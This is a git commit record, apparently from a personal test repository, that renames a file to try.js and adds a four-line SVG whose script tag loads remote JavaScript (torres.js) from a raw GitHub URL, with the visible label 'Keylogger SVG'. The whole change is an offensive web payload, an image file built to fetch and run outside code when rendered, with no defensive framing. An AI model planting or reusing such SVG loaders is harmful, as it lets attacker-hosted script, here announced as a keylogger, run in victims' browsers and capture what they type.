e2c5cd4f042aa3c5d3b1537bfa789566c34e0f33
faridmslmv <135648587+faridmslmv@users.noreply.github.com>
2024-12-17 15:33:30 +0400

    Update and rename try.svg to try.js

---
+++ try.js
@@ -0,0 +1,4 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
+  <script xlink:href="http://raw.githubusercontent.com/faridmslmv/testxml/refs/heads/main/torres.js"></script>
+  <text y="20">Keylogger SVG</text>
+</svg>
